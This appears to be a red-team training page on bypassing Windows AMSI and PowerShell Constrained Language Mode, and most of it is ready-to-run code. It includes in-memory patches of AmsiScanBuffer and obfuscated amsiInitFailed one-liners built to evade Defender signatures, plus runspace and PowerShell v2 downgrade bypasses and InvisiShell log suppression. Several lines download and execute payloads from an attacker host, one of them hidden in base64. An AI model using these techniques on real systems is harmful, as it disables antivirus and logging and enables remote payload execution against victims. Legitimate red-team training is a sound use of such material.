---
layout: training-page
title: "AMSI Bypass — Red Team Academy"
module: "Evasion"
tags:
  - amsi
  - powershell
  - bypass
  - reflection
page_key: "evasion-amsi-bypass"
render_with_liquid: false
---

# AMSI Bypass

## What is AMSI

The Antimalware Scan Interface (AMSI) is a Windows API that allows scripts and applications to request malware scans from the locally installed antivirus/security product. PowerShell, VBScript, JScript, WMI, .NET, and Office macros all feed content through AMSI before execution. When AMSI detects malicious content, it blocks execution and reports to the AV engine.

AMSI operates in-process — the AMSI DLL (`amsi.dll`) is loaded into the scripting host's process memory. This means an attacker with code execution in that process can manipulate AMSI in memory.

![AMSI architecture: script passes through AmsiScanBuffer to AV provider; bypass techniques include patching the function, string obfuscation, and forcing errors](/images/evasion/amsi-pipeline.svg)  
*// amsi detection flow and bypass techniques*

```
># AMSI scan flow:
# Script content → AMSI API (AmsiScanBuffer/AmsiScanString) → AV provider → AMSI_RESULT
# AMSI_RESULT_CLEAN (1) → continue
# AMSI_RESULT_DETECTED (32768+) → block execution

# AMSI is loaded in:
# - powershell.exe, pwsh.exe
# - wscript.exe, cscript.exe
# - mshta.exe
# - Office applications (macros)
# - .NET CLR (when AMSI-aware code calls AmsiScanBuffer)

# AMSI does NOT cover:
# - cmd.exe batch scripts
# - Native PE executables
# - Compiled .NET unless explicitly calling AMSI
```

## Memory Patching — AmsiScanBuffer

The most reliable AMSI bypass patches `AmsiScanBuffer` in memory to always return a clean scan result. This works by overwriting the function's prologue with a return-immediately instruction.

```
># Classic PowerShell AMSI patch (many AV now detect this exact code — obfuscate):
$a = [Ref].Assembly.GetTypes()
ForEach($b in $a){if($b.Name -like '*iUtils'){$c=$b}}
$d = $c.GetFields('NonPublic,Static')
ForEach($e in $d){if($e.Name -like '*Context'){$f=$e}}
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# Alternative — patch amsiInitFailed flag (sets AMSI init to failed):
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetField('amsiInitFailed','NonPublic,Static')
$d.SetValue($null,$true)

# Direct AmsiScanBuffer patch via P/Invoke:
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public class Amsi {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr fn = GetProcAddress(lib, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(fn, (UIntPtr)5, 0x40, out oldProtect);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax, 0x80070057; ret
        Marshal.Copy(patch, 0, fn, 6);
    }
}
'@
[Amsi]::Patch()
```

## Obfuscation to Evade Signature Detection

AMSI providers scan the code itself before it runs. String obfuscation, encoding, and variable name randomization prevent signature matches on known bypass strings.

```
># String concatenation (breaks simple string signatures):
$s = 'Am'+'siScan'+'Buffer'

# Base64 encode and decode at runtime:
$cmd = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA='))
Invoke-Expression $cmd

# Reverse string at runtime:
$b = "reffuBnacSisma"
$a = -join ($b[-1..-($b.Length)])  # reverses to: amsiScanBuffer

# Using char codes:
[char]65 + [char]109 + [char]115 + [char]105  # "Amsi"

# Backtick escaping in strings (PowerShell-specific):
$s = "Am`siScanB`uffer"

# Invoke-Obfuscation (tool for automated obfuscation):
# https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
```

## Downgrade Attack — PowerShell v2

PowerShell v2 does not support AMSI. If PowerShell 2.0 is installed (optional feature, sometimes present on older systems), downgrading bypasses AMSI entirely.

```
># Check if PowerShell 2.0 is available:
Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

# Use PowerShell 2.0 (no AMSI, no CLM, no ScriptBlock logging):
powershell.exe -version 2
powershell.exe -version 2 -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"

# Note: PowerShell 2.0 requires .NET 2.0/3.5
# Check:
[System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription

# PS2 is often available on Windows 7 / Server 2008 systems
# Modern Windows 10/2019 may have it disabled by default
```

## CLM (Constrained Language Mode) Bypass

Constrained Language Mode restricts PowerShell capabilities — it's related to but separate from AMSI. Bypasses include using .NET directly, PS 2.0, or finding whitelisted paths.

```
># Check current language mode:
$ExecutionContext.SessionState.LanguageMode
# FullLanguage | ConstrainedLanguage | RestrictedLanguage | NoLanguage

# CLM bypass — use .NET directly (PowerShell as a .NET host):
# Custom PS host that doesn't respect CLM
# Runspaces bypass CLM:

Add-Type -TypeDefinition @"
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
public class Bypass {
    public static void Run(string cmd) {
        var rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        var ps = PowerShell.Create();
        ps.Runspace = rs;
        ps.AddScript(cmd);
        ps.Invoke();
    }
}
"@
[Bypass]::Run("whoami")

# If Device Guard / WDAC is enforcing CLM:
# Check WDAC policy: Get-CimInstance Win32_DeviceGuard
```

## InvisiShell — Hook-Based AMSI + Logging Bypass

InvisiShell patches `clr.dll` to intercept the AMSI scan path and disable Script Block Logging and Transcription for the session. It runs via two batch files — one for admin contexts, one for non-admin using registry-based hooks. No visible process modification, no PowerShell profile changes.

```
# Download: https://github.com/OmerYa/Invisi-Shell

# Run with admin privileges (uses RunWithPathAsAdmin.bat):
.\RunWithPathAsAdmin.bat

# Run without admin (hooks via HKCU registry key):
.\RunWithRegistryNonAdmin.bat

# What InvisiShell bypasses:
# - AMSI (patches AmsiScanBuffer in clr.dll hook)
# - Script Block Logging (disabled for InvisiShell session)
# - Transcription (disabled for InvisiShell session)
# Creates a clean PowerShell session — load offensive tools freely

# After InvisiShell session starts, load tools normally:
Import-Module PowerView.ps1
Import-Module SharpHound.ps1
```

## AMSI Bypass via COM Object

```
># Using WScript.Shell COM object to run a process outside AMSI context:
$wsh = New-Object -ComObject WScript.Shell
$wsh.Run("powershell.exe -ep bypass -nop -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')", 0, $false)

# Using rundll32 + COM for LOLBin execution (see LOLBins page):
# Some COM objects bypass AMSI by spawning processes that don't load amsi.dll

# .NET Assembly loading (bypasses AMSI for in-memory assembly execution):
# Load assembly bytes into memory and invoke entry point
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.14.5/tool.exe')
$asm = [System.Reflection.Assembly]::Load($bytes)
$entry = $asm.GetType('Namespace.Class').GetMethod('Main')
$entry.Invoke($null, @([string[]]@()))
```

## Bypass — amsiInitFailed via String Concatenation

The original Matt Graeber one-liner sets `amsiInitFailed` to `true`, causing `ScanContent` to return `AMSI_RESULT_NOT_DETECTED` unconditionally. The string `"amsiUtils"` is itself flagged by Defender — string concatenation breaks the signature.

```
# Original (now detected as-is — obfuscate first):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Bypass detection via string concatenation and !$false instead of $true:
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)

# Verify bypass — "amsiUtils" was blocked before but allowed after:
# [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Should return the type after bypass, null before
```

## Bypass — Patch AmsiScanBuffer with E_FAIL Return

`ScanContent` calls `AmsiScanBuffer` — when it returns `S_OK`, the scan result is passed through; when it returns an error code, `AMSI_RESULT_NOT_DETECTED` is used instead. Patching the function to return `E_FAIL (0x80004005)` forces the clean result path. The patch bytes `0xB8 0x05 0x40 0x00 0x80 0xC3` encode `mov eax, 0x80004005; ret`.

```
# Load amsi.dll, get address of AmsiScanBuffer, overwrite with E_FAIL return stub:
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
$patch = [Byte[]] (0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3)
$hModule = [Kernel32]::LoadLibrary("amsi.dll")
$lpAddress = [Kernel32]::GetProcAddress($hModule, "Amsi"+"ScanBuffer")
$lpflOldProtect = 0
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$lpflOldProtect) | Out-Null
$marshal = [System.Runtime.InteropServices.Marshal]
$marshal::Copy($patch, 0, $lpAddress, $patch.Length)
[Kernel32]::VirtualProtect($lpAddress, [UIntPtr]::new($patch.Length), $lpflOldProtect, [ref]$lpflOldProtect) | Out-Null
```

## Bypass — Force Error via amsiContext Corruption

`AmsiOpenSession` checks that the first 4 bytes of `amsiContext` equal `"AMSI"` — if not, it returns `0x80070057` (invalid argument error), which causes `amsiInitFailed` to be set to `true`. Replacing `amsiContext` with a 4-byte buffer (wrong magic bytes) and nulling `amsiSession` forces this error path.

```
# Replace amsiContext with invalid 4-byte buffer; null amsiSession:
$utils = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
$context = $utils.GetField('amsi'+'Context','NonPublic,Static')
$session = $utils.GetField('amsi'+'Session','NonPublic,Static')
$marshal = [System.Runtime.InteropServices.Marshal]
$newContext = $marshal::AllocHGlobal(4)
$context.SetValue($null,[IntPtr]$newContext)
$session.SetValue($null,$null)
# AmsiOpenSession now fails → amsiInitFailed set to true → AMSI bypassed
```

## PowerShell Constrained Language Mode — Language Modes and Runspace Bypass

When AppLocker is configured, PowerShell automatically enforces `ConstrainedLanguage` mode for non-elevated sessions. This blocks `Add-Type`, method invocation on non-core types, and most .NET API access. The bypass: create a custom .NET executable that spins up a `RunspaceFactory.CreateRunspace()` — runspaces default to `FullLanguage` regardless of AppLocker policy, bypassing CLM entirely.

```
# Check language mode (only visible in FullLanguage or ConstrainedLanguage):
$ExecutionContext.SessionState.LanguageMode
# FullLanguage       — default, no restrictions
# ConstrainedLanguage — AppLocker/WDAC active; Add-Type blocked, .NET types restricted
# RestrictedLanguage  — only commands, no script blocks
# NoLanguage          — scripting entirely disabled

# ConstrainedLanguage mode restrictions:
# - Add-Type cannot load arbitrary C# or Win32 APIs
# - Method invocation only on core types (not [Ref].Assembly, etc.)
# - COM object creation blocked
# - Only types in safe whitelist accessible

# Example of what fails in CLM:
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,!$false)
# Error: "Method invocation is supported only on core types in this language mode."

# CLM Bypass — custom runspace (C# .NET Framework Console App):
# Reference: System.Management.Automation.dll from GAC
# C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

# CLMBypass.exe template — execute arbitrary PS commands in FullLanguage runspace:
# static void Main(string[] args) {
#     if (args.Length == 0) return;
#     Runspace runspace = RunspaceFactory.CreateRunspace();  // FullLanguage by default
#     runspace.Open();
#     PowerShell ps = PowerShell.Create();
#     ps.Runspace = runspace;
#     ps.AddScript(String.Join(" ", args));
#     foreach (PSObject obj in ps.Invoke()) Console.WriteLine(obj.ToString());
#     runspace.Close();
# }

# Compile as x64 Release, copy to a path allowed by AppLocker:
copy CLMBypass.exe C:\Windows\Tasks\CLMBypass.exe

# Execute PS code bypassing CLM:
C:\Windows\Tasks\CLMBypass.exe whoami
C:\Windows\Tasks\CLMBypass.exe "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,!`$false)"

# Downgrade to PowerShell 2.0 (also bypasses CLM and AMSI — PS2 predates both):
powershell.exe -version 2
# Only works if PowerShell 2.0 optional feature is installed (deprecated since 2017)
```
